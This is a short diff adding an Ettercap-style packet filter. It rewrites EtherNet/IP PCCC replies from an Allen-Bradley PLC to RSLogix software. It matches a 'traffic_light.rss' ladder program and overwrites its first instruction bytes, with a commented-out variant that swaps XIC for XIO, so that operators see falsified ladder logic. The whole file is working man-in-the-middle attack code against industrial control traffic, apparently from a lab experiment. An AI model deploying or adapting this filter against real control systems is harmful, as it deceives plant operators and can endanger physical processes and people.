@@ -1,0 +1,27 @@
+################################################
+#                                              #   
+#        Modify packets: PLC -> RSLogix        #
+#                                              #
+################################################
+
+if (ip.proto == TCP && tcp.src == 44818) {
+# Below is highly targeted to specific configuration (Can't be generally used)
+# Maybe I need to find other way to use variable and save state information. Try scapy??
+    if (DATA.pccc == "\x4f" && DATA.pccc+1 == "\x00"){         # Reply
+#        if (DATA.pccc+8 == "\xd4" && DATA.pccc+9 == "\x02"){
+        if (DATA.pccc+6 == "\x8d" && DATA.pccc+7 == "\x9a"){        # First rung signature of traffic_light.rss
+            if (DATA.pccc+10 == "\xe4" && DATA.pccc+11 == "\x00"){  # First instruction in traffic_light.rss
+                msg("I catch XIC in being uploaded ladder logic program");
+    #            DATA.pccc+10 = "\xbc";      # Change XIC to XIO
+                DATA.pccc+10 = "\xff";
+                DATA.pccc+11 = "\xff";
+                DATA.pccc+12 = "\xff";
+                DATA.pccc+13 = "\xff";
+                DATA.pccc+14 = "\xff";
+                DATA.pccc+15 = "\xff";
+                DATA.pccc+16 = "\xff";
+                DATA.pccc+17 = "\xff";
+            }  
+        }
+    }
+}
